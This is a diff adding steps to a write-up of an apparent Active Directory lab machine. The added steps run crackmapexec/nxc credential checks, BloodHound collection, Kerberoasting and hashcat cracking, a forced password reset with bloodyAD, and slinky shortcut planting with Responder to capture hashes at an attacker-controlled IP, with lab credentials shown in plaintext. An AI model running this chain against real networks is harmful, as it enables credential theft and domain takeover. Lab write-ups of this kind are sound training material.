@@ -107,19 +107,115 @@ r.widdleton	lilronron
 t.ren		shadowhex7
 ----
 
+*Validate* this users by crackmapexec or nxc by `smb`
 
+[source]
+----
+crackmapexec smb 10.1.74.139  -u r.widdleton -p lilronron --shares 
+#
+nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --shares
+----
 
+So i got a user `r.widdleton` : `lilronron`
 
 
 
 [[ad-enum]]
 == AD Enumeration
+=== BloodHound
+I use it when i want to map Active Directory findings
+Default commands to start bloodhound:
+
+[source]
+----
+sudo neo4j start
+bloodhound-python -d 'buildingmagic.local' -u 'r.widdleton' -p 'lilronron' -dc 'dc01.buildingmagic.local' -c all -ns 10.1.80.37 
+----
+
+`BloodHound` cathes information about system and save into `json` files
+
+After starting `bloodhound-cli` - upload `json` files
+
+=== Possible attack path
+`First degree object control` found `r.haggard` as a *kerbeous* user this user has privilage to change password of `h.potch`
+
+*ForceChangePassword* privilage means that we can change user password
+
+If user is kerbeous we can catch his ticket.
+
+=== Ticket catching
+
+Start a `responder`
+[source]
+----
+sudo responder -I tun0    
+----
+
+Catch hash by `nxc`
+[source]
+----
+nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoasting output.txt
+----
+
+Crack password by `hashcat`
+[source]
+----
+hashcat hash.txt /wordlists/rockyou.txt
+----
+
+Check if user is correct by `nxc`
+
+So we had a new owned user `r.haggard` : `rubeushagrid`
+
+=== Changing password for h.potch
+
+As we mentioned user `r.haggard` has a *ForceChangePassword* privilage to user `h.potch`
+
+So we can change password of `h.potch`
+
+[source]
+----
+bloodyAD --host "10.1.80.37" -d 'dc01.buildingmagic.local' -u  'r.haggard' -p  'rubeushagrid' set password 'h.potch' 'fuckpass'
+----
+
+Check if user is correct by `nxc`
+
+Owned new user `h.potch` : `fuckpass`
 
 
 
 [[ad-access]]
 == AD Enumeration & Access
+=== Smb Enemuration
+As we owned new user let's check smb shares
 
+[source]
+----
+crackmapexec smb 10.1.80.37 -u h.potch  -p fuckpass  --shares
+----
+
+We have a write permisions on share File-Share it's a point for next steps
+
+Using `nxc` i searched some modules and find `slinky` module 
+
+`slinky` - Creates windows shortcuts with the icon attribute containing a `URI` to the specified  server (default SMB) in all shares with write permissions
+
+We need only to create a link in File-Share and need wait when user open this
+
+
+[source]
+----
+nxc smb buildingmagic.local  -M slinky -u 'h.potch' -p 'fuckpass' -o SERVER=10.200.19.165 SHARES=File-Share NAME=smarter
+----
+
+Also don't forgot to start 
+
+[source]
+----
+sudo responder -I tun0
+----
+
+Here we go we got a `h.grangon` user hash
 
 
 [[privesc]]
